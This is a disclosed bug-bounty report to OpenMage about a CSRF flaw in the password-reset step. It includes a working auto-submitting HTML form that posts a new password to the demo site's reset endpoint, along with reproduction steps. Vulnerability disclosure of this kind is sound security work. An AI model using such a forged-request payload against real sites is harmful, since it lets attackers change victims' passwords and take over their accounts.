# CSRF in changing password after using reset password link

## Report Details
- **Report ID**: 1086752
- **URL**: https://hackerone.com/reports/1086752
- **State**: Closed
- **Severity**: low
- **Submitted**: 2021-01-25T14:47:04.896Z
- **Disclosed**: 2021-05-27T08:55:08.327Z

## Reporter
- **Username**: xenx
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: openmage

## Vulnerability Information
## Summary:
Hey OpenMage, the forgot password page is not protected against CSRF attack which can lead to changing password. Use the below form  to test
```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```
## Steps To Reproduce:

  1. Go to  ```https://demo.openmage.org/customer/account/forgotpassword/```
  2. Enter your email  and ask for password reset link
  3. Load the password reset link and after loading it close it
  4. Now load the above form and boom, password will be changed.

## Impact

Password reset via CSRF

## Attachments
No attachments
